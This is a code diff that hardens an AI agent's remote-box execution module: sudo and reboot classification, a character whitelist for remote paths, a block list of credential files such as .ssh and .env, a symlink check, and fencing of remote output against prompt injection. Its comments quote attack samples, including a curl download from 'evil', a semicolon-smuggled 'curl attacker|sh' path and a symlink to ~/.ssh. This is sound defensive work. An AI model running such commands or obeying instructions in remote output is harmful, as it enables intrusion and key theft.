@@ -6,6 +6,7 @@ import { promisify } from "node:util";
 import { config, DATA_DIR } from "./config.js";
 import { redact } from "./redact.js";
 import { fenceUntrusted } from "./browser-ax.js";
+import { defuse } from "./workspace.js";
 
 const execFileAsync = promisify(execFile);
 
@@ -63,7 +64,9 @@ export function boxes(): Box[] {
       user: String(b.user),
       port: Number(b.port) || 22,
       identityFile: b.identityFile ? String(b.identityFile) : undefined,
-      workdir: b.workdir ? String(b.workdir) : `/home/${b.user}`,
+      // NOT the whole home directory: that made ".ssh/id_ed25519" textually
+      // inside the workdir for any box whose config omitted the field.
+      workdir: b.workdir ? String(b.workdir) : `/home/${b.user}/claw-work`,
       jobsDir: b.jobsDir ? String(b.jobsDir) : undefined,
       allowSudo: b.allowSudo === true,
       allowReboot: b.allowReboot === true,
@@ -168,18 +171,25 @@ export function classifyRemoteCommand(
   box: Box,
   classify: (c: string) => Verdict,
 ): { verdict: Verdict; why?: string } {
+  // sudo is checked FIRST. It used to sit after the reboot branch, which
+  // returned early — so on a box with allowReboot and not allowSudo,
+  // "sudo reboot" was approved and so was
+  // "sudo shutdown -h now && curl http://evil/x -o /tmp/x".
+  if (/\bsudo\b/.test(command) && !box.allowSudo) {
+    return { verdict: "deny", why: `sudo is not enabled for ${box.id} (set allowSudo on the box to permit it)` };
+  }
   const local = classify(command);
   if (local === "deny") {
-    const rebootOnly =
-      /\b(shutdown|reboot|poweroff|halt)\b/i.test(command) &&
-      classify(command.replace(/\b(shutdown|reboot|poweroff|halt)\b/gi, "echo")) !== "deny";
+    // Only a command that is NOTHING BUT a restart may be downgraded. Inferring
+    // "reboot-only" from a substitution also laundered any other deny that
+    // happened to contain the word — an operator's own denied ./shutdown-prod.sh
+    // became "approve", described on the card as restarting the box, which was
+    // simply untrue.
+    const rebootOnly = /^\s*(sudo\s+)?(shutdown|reboot|poweroff|halt)\b[^;&|]*$/i.test(command);
     if (rebootOnly && box.allowReboot) {
       return { verdict: "approve", why: `restarts ${box.id} and kills every job running on it` };
     }
     return { verdict: "deny" };
-  }
-  if (/\bsudo\b/.test(command) && !box.allowSudo) {
-    return { verdict: "deny", why: `sudo is not enabled for ${box.id} (set allowSudo on the box to permit it)` };
   }
   return { verdict: local };
 }
@@ -246,7 +256,7 @@ export function formatRemoteOutput(box: Box, stdout: string, stderr: string, cod
     stderr && `stderr:\n${stderr}`,
   ].filter(Boolean).join("\n") || "(no output)";
   const head = `exit ${code} on ${box.id} (${box.user}@${box.host})`;
-  return `${head}\n${fenceUntrusted(`remote:${box.id}`, redact(body).slice(0, cap))}`;
+  return `${head}\n${fenceUntrusted(`remote:${box.id}`, redact(defuse(body)).slice(0, cap))}`;
 }
 
 /** POSIX single-quote, so a path with a space or a quote cannot break out. */
@@ -301,7 +311,7 @@ export function statusScript(jobDir: string, tailLines = 1): string {
     `if [ -n "$p" ] && kill -0 "$p" 2>/dev/null; then printf 'alive=1\\n'; else printf 'alive=0\\n'; fi`,
     `printf 'out=%s\\n' "$(wc -c < ${d}/out 2>/dev/null || echo 0)"`,
     `printf 'err=%s\\n' "$(wc -c < ${d}/err 2>/dev/null || echo 0)"`,
-    `printf 'last=%s\\n' "$(tail -n ${Number(tailLines) || 1} ${d}/out 2>/dev/null | tr '\\n' ' ')"`,
+    `printf 'last=%s\\n' "$(tail -n ${Number(tailLines) || 1} ${d}/out 2>/dev/null | tr '\\n' ' ' | cut -c1-200)"`,
   ].join("\n");
 }
 
@@ -358,21 +368,25 @@ export function parseJobStatus(raw: string): JobStatus {
  */
 export function statusText(name: string, box: Box, s: JobStatus): string {
   const head = `job ${name} on ${box.id}`;
+  // The last line is the job's own stdout — a build log, i.e. attacker-controlled
+  // under the same threat model as any page. It went out raw here, which
+  // contradicted this module's own rule two functions up and handed the model
+  // an unmarked instruction channel. Fence it like everything else a box says.
+  const tail = s.last
+    ? "\n" + fenceUntrusted(`remote:${box.id}`, redact(defuse(s.last)).slice(0, 500))
+    : "";
   if (s.state === "finished") {
-    return `${head}: finished, exit ${s.exit}. out ${s.outBytes} bytes, err ${s.errBytes} bytes.` +
-      (s.last ? `\nlast: ${s.last}` : "");
+    return `${head}: finished, exit ${s.exit}. out ${s.outBytes} bytes, err ${s.errBytes} bytes.${tail}`;
   }
   if (s.state === "died") {
     return (
       `${head}: DIED with no exit code — the process is gone and never wrote one. ` +
       `That usually means the box rebooted, the kernel killed it for memory, or the login ` +
-      `session was reaped. out ${s.outBytes} bytes, err ${s.errBytes} bytes.` +
-      (s.last ? `\nlast: ${s.last}` : "")
+      `session was reaped. out ${s.outBytes} bytes, err ${s.errBytes} bytes.${tail}`
     );
   }
   if (s.state === "unknown") return `${head}: could not be read — the box did not answer.`;
-  return `${head}: running. out ${s.outBytes} bytes, err ${s.errBytes} bytes.` +
-    (s.last ? `\nlast: ${s.last}` : "");
+  return `${head}: running. out ${s.outBytes} bytes, err ${s.errBytes} bytes.${tail}`;
 }
 
 /**
@@ -387,12 +401,53 @@ export function statusText(name: string, box: Box, s: JobStatus): string {
 export function remotePathOk(box: Box, p: string): boolean {
   const raw = String(p ?? "").trim();
   if (!raw) return false;
-  // No quotes or newlines: those are argument-injection shapes, not filenames.
-  if (/["'\n\r]/.test(raw)) return false;
+  // A WHITELIST, not a blacklist. scp in its legacy RCP mode hands the remote
+  // path to the box's login SHELL, and SFTP mode only became the default in
+  // OpenSSH 9 — below that (Ubuntu 22.04, a Pi, the spare box this is written
+  // for) a path like `out;curl attacker|sh` executes on the box, past
+  // classifyRemoteCommand and past the whole command floor, because copy
+  // classifies nothing. Blacklisting quotes was not close to enough: spaces,
+  // semicolons, backticks, $(), | and * all got through.
+  if (!/^[A-Za-z0-9._/@+-]+$/.test(raw)) return false;
   const base = box.workdir.replace(/\/+$/, "");
   const abs = raw.startsWith("/") ? raw : `${base}/${raw}`;
   const norm = path.posix.normalize(abs);
-  return norm === base || norm.startsWith(base + "/");
+  if (norm !== base && !norm.startsWith(base + "/")) return false;
+  // The local side refuses to read or write a key or a .env; the remote side
+  // must refuse the same names, or a pull just fetches the box's own secrets.
+  return !REMOTE_SENSITIVE.some((re) => re.test(norm));
+}
+
+/** The same shapes paths.ts refuses locally, applied to the far side. */
+const REMOTE_SENSITIVE: RegExp[] = [
+  /(^|\/)\.ssh(\/|$)/i,
+  /(^|\/)\.gnupg(\/|$)/i,
+  /(^|\/)\.aws(\/|$)/i,
+  /(^|\/)\.env(\.[^/]*)?$/i,
+  /(^|\/)id_[a-z0-9_]+$/i,
+  /(^|\/)authorized_keys$/i,
+  /\.(pem|p12|pfx|jks|keystore)$/i,
+  /(^|\/)\.netrc$/i,
+  /(^|\/)\.git-credentials$/i,
+];
+
+/**
+ * Does the box agree this path is inside the workdir once symlinks resolve?
+ *
+ * remotePathOk reasons about a string; it cannot see the far filesystem. The
+ * attacker controls files on the box, so `ln -s ~/.ssh work/artifacts` makes a
+ * key textually inside the workdir and scp follows the link. The local side
+ * already resolves symlinks before deciding (paths.ts); this is the missing
+ * half of that check.
+ */
+export function realpathCheckScript(box: Box, remoteAbs: string): string {
+  const base = shQuote(box.workdir.replace(/\/+$/, ""));
+  const target = shQuote(remoteAbs);
+  return (
+    `r="$(readlink -f ${target} 2>/dev/null || echo ${target})"; ` +
+    `b="$(readlink -f ${base} 2>/dev/null || echo ${base})"; ` +
+    `case "$r" in "$b"|"$b"/*) echo INSIDE ;; *) echo OUTSIDE ;; esac`
+  );
 }
 
 /** Absolute form of a remote path, resolved against the workdir. */
@@ -444,9 +499,24 @@ export function saveJobs(jobs: JobRecord[]): void {
   } catch { /* the box is the source of truth; the index is a convenience */ }
 }
 
+/**
+ * A job name is model-chosen and later reappears in a message delivered to the
+ * operator hours afterwards, in a cleared context. A name carrying newlines
+ * could impersonate a new speaker in that message, so it is clamped at the
+ * point it is stored rather than at each place it is read.
+ */
+export function safeJobName(name: string): string {
+  return String(name ?? "")
+    .replace(/[\r\n]+/g, " ")
+    .replace(/<\/?(untrusted|recorded)[^>]*>/gi, "")
+    .replace(/[^\w .:@+-]/g, "")
+    .trim()
+    .slice(0, 60) || "job";
+}
+
 export function rememberJob(rec: JobRecord): void {
   const jobs = loadJobs().filter((j) => j.id !== rec.id);
-  jobs.push(rec);
+  jobs.push({ ...rec, name: safeJobName(rec.name) });
   saveJobs(jobs);
 }
 
